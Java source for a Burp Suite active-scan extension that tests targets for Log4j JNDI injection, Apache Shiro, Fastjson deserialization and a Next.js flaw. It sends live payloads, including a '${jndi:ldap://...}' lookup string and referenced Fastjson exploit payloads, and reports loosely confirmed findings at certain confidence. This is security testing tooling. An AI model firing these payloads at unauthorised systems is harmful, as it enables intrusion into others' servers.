package com.scanner.checks;

import burp.api.montoya.http.Http;
import burp.api.montoya.http.message.ContentType;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.api.montoya.scanner.scancheck.ActiveScanCheck;
import com.scanner.ApiLogger;
import com.scanner.ui.ScannerDashboard;
import com.scanner.util.CollaboratorHelper;
import com.scanner.vuln.FastjsonPayloads;
import com.scanner.vuln.Log4jDetector;
import com.scanner.vuln.NextJsDetector;
import com.scanner.vuln.ShiroDetector;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

import static burp.api.montoya.core.ByteArray.byteArray;
import static burp.api.montoya.scanner.AuditResult.auditResult;
import static burp.api.montoya.scanner.ConsolidationAction.KEEP_BOTH;
import static burp.api.montoya.scanner.ConsolidationAction.KEEP_EXISTING;
import static burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue;
import static java.util.Collections.emptyList;

public class ActiveScanChecks implements ActiveScanCheck {

    private static final String ECHO_PAYLOAD = "CVE-2025-55182-TEST";
    private static final Pattern JSON_PATTERN = Pattern.compile("^\\s*[{{]", Pattern.MULTILINE);

    private final ApiLogger logger;
    private final ScannerDashboard dashboard;
    private final CollaboratorHelper collaboratorHelper;

    public ActiveScanChecks(ApiLogger logger, ScannerDashboard dashboard, CollaboratorHelper collaboratorHelper) {
        this.logger = logger;
        this.dashboard = dashboard;
        this.collaboratorHelper = collaboratorHelper;
        this.logger.setScanName("ActiveScan");
    }

    @Override
    public String checkName() {
        return "Vulnerability Active Scan";
    }

    @Override
    public AuditResult doCheck(HttpRequestResponse requestResponse, AuditInsertionPoint insertionPoint, Http http) {
        if (!dashboard.isActiveScanEnabled()) {
            return auditResult(emptyList());
        }

        List<AuditIssue> issues = new ArrayList<>();
        String url = requestResponse.request().url();
        String domain = extractDomain(url);
        String body = requestResponse.request().bodyToString();

        if (dashboard.isLog4jEnabled()) {
            issues.addAll(testLog4j(requestResponse, insertionPoint, http, domain));
        }

        if (dashboard.isShiroEnabled()) {
            issues.addAll(testShiro(requestResponse, insertionPoint, http, domain));
        }

        if (dashboard.isFastjsonEnabled() && isJsonTarget(requestResponse)) {
            issues.addAll(testFastjson(requestResponse, insertionPoint, http, domain, body));
        }

        if (dashboard.isNextJsEnabled()) {
            issues.addAll(testNextJs(requestResponse, insertionPoint, http, domain));
        }

        return auditResult(issues.isEmpty() ? emptyList() : issues);
    }

    private List<AuditIssue> testLog4j(HttpRequestResponse requestResponse, AuditInsertionPoint insertionPoint, Http http, String domain) {
        List<AuditIssue> issues = new ArrayList<>();
        Log4jDetector detector = new Log4jDetector(collaboratorHelper);

        logger.logSectionStart(domain, "Log4j");

        if (detector.isVulnerable(requestResponse)) {
            logger.log(ApiLogger.Level.VULN, domain, "JNDI pattern detected in request");
            dashboard.log("Active", "Log4j RCE", domain, requestResponse.request().url(), requestResponse);

            HttpRequest testRequest = insertionPoint.buildHttpRequestWithPayload(byteArray("${jndi:ldap://test}"))
                    .withService(requestResponse.httpService());
            http.sendRequest(testRequest);

            issues.add(createIssue("Log4j RCE", "JNDI injection pattern confirmed", requestResponse));
        } else {
            logger.logInfo(domain, "No JNDI pattern found");
        }

        logger.logSectionEnd(domain, "Log4j");
        return issues;
    }

    private List<AuditIssue> testShiro(HttpRequestResponse requestResponse, AuditInsertionPoint insertionPoint, Http http, String domain) {
        List<AuditIssue> issues = new ArrayList<>();
        ShiroDetector detector = new ShiroDetector();

        logger.logSectionStart(domain, "Shiro");

        if (detector.isVulnerable(requestResponse)) {
            logger.log(ApiLogger.Level.VULN, domain, "rememberMe cookie detected");
            dashboard.log("Active", "Apache Shiro", domain, requestResponse.request().url(), requestResponse);

            issues.add(createIssue("Apache Shiro Authentication Bypass", "rememberMe cookie found", requestResponse));
        } else if (ShiroDetector.hasShiroFingerprint(requestResponse)) {
            logger.log(ApiLogger.Level.VULN, domain, "rememberMe fingerprint in Set-Cookie");
            dashboard.log("Active", "Apache Shiro", domain, requestResponse.request().url(), requestResponse);

            issues.add(createIssue("Apache Shiro Authentication Bypass", "rememberMe fingerprint detected", requestResponse));
        } else {
            logger.logInfo(domain, "No Shiro indicators found");
        }

        logger.logSectionEnd(domain, "Shiro");
        return issues;
    }

    private List<AuditIssue> testFastjson(HttpRequestResponse requestResponse, AuditInsertionPoint insertionPoint, Http http, String domain, String originalBody) {
        List<AuditIssue> issues = new ArrayList<>();

        logger.logSectionStart(domain, "Fastjson");
        logger.logInfo(domain, "Request body: " + originalBody);

        List<String> payloads = buildFastjsonPayloads(originalBody, domain);

        int count = 0;
        for (String payload : payloads) {
            count++;
            logger.logInfo(domain, "Testing payload [" + count + "/" + payloads.size() + "]: " + payload);

            try {
                HttpRequest testRequest = insertionPoint.buildHttpRequestWithPayload(byteArray(payload))
                        .withService(requestResponse.httpService());

                HttpRequestResponse testResponse = http.sendRequest(testRequest);

                if (testResponse != null && testResponse.response() != null) {
                    String responseBody = testResponse.response().bodyToString();
                    int statusCode = testResponse.response().statusCode();

                    logger.logInfo(domain, "Response status: " + statusCode);

                    if (statusCode >= 500 || responseBody.contains("syntax error") ||
                        responseBody.contains("fastjson") || responseBody.contains("autoCloseable")) {

                        String responsePreview = responseBody.substring(0, Math.min(100, responseBody.length()));
                        logger.logVuln(domain, "Fastjson RCE", payload, "Response: " + responsePreview);
                        dashboard.log("Active", "Fastjson RCE", domain, requestResponse.request().url(), testResponse);
                        issues.add(createIssue("Fastjson RCE", "Fastjson vulnerability detected", requestResponse));
                        break;
                    }
                }
            } catch (Exception e) {
                logger.logError(domain, "Error: " + e.getMessage());
            }
        }

        if (issues.isEmpty()) {
            logger.logInfo(domain, "No vulnerability found");
        }

        logger.logSectionEnd(domain, "Fastjson");
        return issues;
    }

    private boolean isJsonTarget(HttpRequestResponse requestResponse) {
        if (requestResponse.request().contentType() == ContentType.JSON) {
            return true;
        }
        String body = requestResponse.request().bodyToString();
        return body != null && !body.isEmpty() && JSON_PATTERN.matcher(body).find();
    }

    private List<String> buildFastjsonPayloads(String originalBody, String targetHost) {
        List<String> payloads = new ArrayList<>();

        payloads.addAll(FastjsonPayloads.Detection.getSyntaxErrorPayloads());
        payloads.addAll(FastjsonPayloads.Detection.getDynamicSyntaxErrorPayloads(originalBody));
        payloads.add(FastjsonPayloads.Detection.AUTO_CLOSEABLE_VERSION);
        payloads.addAll(FastjsonPayloads.Detection.getVersionBypassPayloads());

        if (collaboratorHelper != null) {
            String dnsPayload = collaboratorHelper.generatePayload();
            payloads.addAll(FastjsonPayloads.Detection.getDnsPayloads(dnsPayload));
        }

        payloads.add(String.format(FastjsonPayloads.Exploit.JdbcRowSetImpl_Basic, targetHost));
        payloads.add(String.format(FastjsonPayloads.Exploit.Shiro_AutoType, targetHost));

        return payloads;
    }

    private List<AuditIssue> testNextJs(HttpRequestResponse requestResponse, AuditInsertionPoint insertionPoint, Http http, String domain) {
        List<AuditIssue> issues = new ArrayList<>();
        NextJsDetector detector = new NextJsDetector();

        logger.logSectionStart(domain, "Next.js");

        if (detector.isVulnerable(requestResponse)) {
            logger.log(ApiLogger.Level.VULN, domain, "Next.js framework detected");
            dashboard.log("Active", "Next.js RCE", domain, requestResponse.request().url(), requestResponse);

            HttpRequest testRequest = insertionPoint.buildHttpRequestWithPayload(byteArray(ECHO_PAYLOAD))
                    .withService(requestResponse.httpService());
            HttpRequestResponse testResponse = http.sendRequest(testRequest);

            if (testResponse != null && testResponse.response() != null) {
                String body = testResponse.response().bodyToString();
                if (body.contains(ECHO_PAYLOAD)) {
                    logger.logVuln(domain, "Next.js RCE", ECHO_PAYLOAD, "Echo confirmed in response");
                    issues.add(createIssue("Next.js RCE", "Next.js RCE confirmed", requestResponse));
                }
            }
        } else {
            logger.logInfo(domain, "No Next.js indicators found");
        }

        logger.logSectionEnd(domain, "Next.js");
        return issues;
    }

    private AuditIssue createIssue(String name, String detail, HttpRequestResponse requestResponse) {
        return auditIssue(
                name, detail, null, requestResponse.request().url(),
                AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN,
                null, null, AuditIssueSeverity.HIGH, requestResponse
        );
    }

    @Override
    public ConsolidationAction consolidateIssues(AuditIssue existingIssue, AuditIssue newIssue) {
        return existingIssue.name().equals(newIssue.name()) ? KEEP_EXISTING : KEEP_BOTH;
    }

    private String extractDomain(String url) {
        try {
            java.net.URL urlObj = new java.net.URL(url);
            return urlObj.getHost() + ":" + urlObj.getPort();
        } catch (Exception e) {
            return url;
        }
    }
}